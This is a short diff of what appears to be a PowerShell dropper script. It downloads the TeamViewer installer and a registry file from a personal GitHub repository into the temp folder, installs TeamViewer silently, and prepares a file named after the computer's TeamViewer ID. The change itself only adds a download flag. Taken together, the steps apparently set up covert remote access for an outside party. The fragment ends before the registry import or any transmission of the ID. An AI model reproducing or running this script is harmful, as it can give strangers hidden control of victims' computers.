@@ -2,8 +2,8 @@
 $p = "$env:temp"
 $i = "$p\TeamViewer_Setup.exe"
 $r = "$p\tv.reg"
-iwr "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe" -o $i
-iwr "https://raw.githubusercontent.com/d77juan/t3st1n6/main/tv.reg" -o $r
+iwr -useb "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe" -o $i
+iwr -useb "https://raw.githubusercontent.com/d77juan/t3st1n6/main/tv.reg" -o $r
 $l = "$p\$env:COMPUTERNAME-TV-ID.txt"
 start -wait $i /S
 sleep 2
